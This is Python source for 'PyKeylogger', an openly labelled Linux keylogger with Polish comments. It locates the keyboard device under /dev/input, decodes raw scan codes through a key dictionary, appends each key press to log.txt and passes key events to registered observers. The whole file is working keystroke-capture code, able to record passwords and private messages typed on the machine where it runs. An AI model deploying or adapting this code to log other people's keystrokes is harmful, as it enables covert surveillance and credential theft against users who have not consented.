#!/usr/bin/python

# --
# NoweEnergie.org
# Marcin Filipiak
# PyKeylogger
# GNU General Public License (GPL)
# --

import threading
import time
import struct
import os


KEY_DICTIONARY = { 
        0x01: '[esc]',
        0x02: '1',
        0x03: '2',
        0x04: '3',
        0x05: '4',
        0x06: '5',
        0x07: '6',
        0x08: '7',
        0x09: '8',
        0x0a: '9',
        0x0b: '0',
        0x0c: '-',
        0x0e: '[backspace]',
        0x10: 'q',
        0x11: 'w',
        0x12: 'e',
        0x13: 'r',
        0x14: 't',
        0x15: 'y',
        0x16: 'u',
        0x17: 'i',
        0x18: 'o',
        0x19: 'p',
        0x1a: '[',
        0x1b: ']',
        0x1c: '[enter]',
        0x1d: '[ctrl]',
        0x1e: 'a',
        0x1f: 's',
        0x20: 'd',
        0x21: 'f',
        0x22: 'g',
        0x23: 'h',
        0x24: 'j',
        0x25: 'k',
        0x26: 'l',
        0x27: ';',
        0x28: '\'',
        0x2a: '[shift]',
        0x2b: '\\',
        0x2c: 'z',
        0x2d: 'x',
        0x2e: 'c',
        0x2f: 'v',
        0x30: 'b',
        0x31: 'n',
        0x32: 'm',
        0x33: ',',
        0x34: '.',
        0x35: '/',
        0x38: '[alt]'
        }


#dodanie akcji do listy krokow
def add_log(s): 
	f = open('log.txt','a')
	if s == "[enter]":
		f.write(s+'\n') 
	else:
		f.write(s) 
	f.close() 

def ScanCodeToKeyCode(aCode):
	if aCode in KEY_DICTIONARY:
		#add_log(KEY_DICTIONARY[aCode])
		return KEY_DICTIONARY[aCode]
	return '[unknown]'

def get_keyboard_file():
	path = "/dev/input"
	for fname in os.listdir(path):
		fname = path + "/" + fname
		if os.path.isdir(fname) and ("by" in fname):
			path = fname
			break
	for fname in os.listdir(path):
		fname = path + "/" + fname
		if "kbd" in fname:
			return fname
	return None
	

class keylogging_observer:
	def keylogging_notify(self, keycodes):
		pass

class keylogging_thread(threading.Thread):
	def __init__ ( self ):
		self.m_EventsFile = open(get_keyboard_file(), "rb")
		self.m_Clients = []
		threading.Thread.__init__ ( self )
		self.keep_running = True
	
	def start(self):
		self.keep_running = True
		threading.Thread.start(self)
    
	def run ( self ):
		pressedKeys = []
		while self.keep_running:
			row = self.m_EventsFile.read(0x10)
			givenUnixTimeStamp = time.gmtime( struct.unpack("<l", row[:4])[0] )
			delayedTimeStamp = time.time()
			if 1 == ord(row[8]):
				scanCode = ord(row[10])
				keyCode = ScanCodeToKeyCode(scanCode)
				
				if 1 == ord(row[12]):
					# key-down event
					#zapisywanie danych do pliku
					add_log(keyCode)
					pressedKeys.append(keyCode)
				if 0 == ord(row[12]):
					# key-up event
					if keyCode in pressedKeys:
						pressedKeys.remove(keyCode)
					eventCodes = pressedKeys[:]
					eventCodes.append(keyCode)
					for client in self.m_Clients:
						client.keylogging_notify(eventCodes)
	
	def stop(self):
		self.keep_running = False
						

	def register(self, client):
		self.m_Clients.append(client)
	

if "__main__" == __name__:
	app = keylogging_thread()
	app.run()

